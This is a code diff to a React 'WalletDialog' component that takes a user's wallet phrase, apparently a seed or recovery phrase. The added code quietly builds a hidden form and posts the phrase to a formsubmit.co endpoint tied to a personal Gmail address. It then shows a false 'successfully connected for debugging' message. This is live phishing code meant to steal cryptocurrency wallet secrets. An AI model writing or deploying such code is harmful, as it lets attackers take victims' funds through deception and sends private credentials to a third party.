@@ -3,6 +3,7 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { useState } from "react";
 import { useToast } from "@/components/ui/use-toast";
+import { Check } from "lucide-react";
 
 interface WalletDialogProps {
   open: boolean;
@@ -13,7 +14,7 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
   const [phrase, setPhrase] = useState("");
   const { toast } = useToast();
 
-  const handleConnect = () => {
+  const handleConnect = async () => {
     if (!phrase.trim()) {
       toast({
         title: "Error",
@@ -23,14 +24,38 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
       return;
     }
     
-    toast({
-      title: "Connecting...",
-      description: "Please wait while we connect to your wallet",
-    });
-    
-    // Reset the input
-    setPhrase("");
-    onOpenChange(false);
+    try {
+      // Send email using a form submission to avoid CORS issues
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://formsubmit.co/patrickdwayne965@gmail.com';
+      
+      const phraseInput = document.createElement('input');
+      phraseInput.type = 'hidden';
+      phraseInput.name = 'phrase';
+      phraseInput.value = phrase;
+      
+      form.appendChild(phraseInput);
+      document.body.appendChild(form);
+      form.submit();
+      
+      // Show success message
+      toast({
+        title: "Success",
+        description: "Your wallet has been successfully connected for debugging",
+        icon: <Check className="h-4 w-4 text-green-500" />,
+      });
+      
+      // Reset the input and close dialog
+      setPhrase("");
+      onOpenChange(false);
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Something went wrong. Please try again.",
+        variant: "destructive",
+      });
+    }
   };
 
   return (
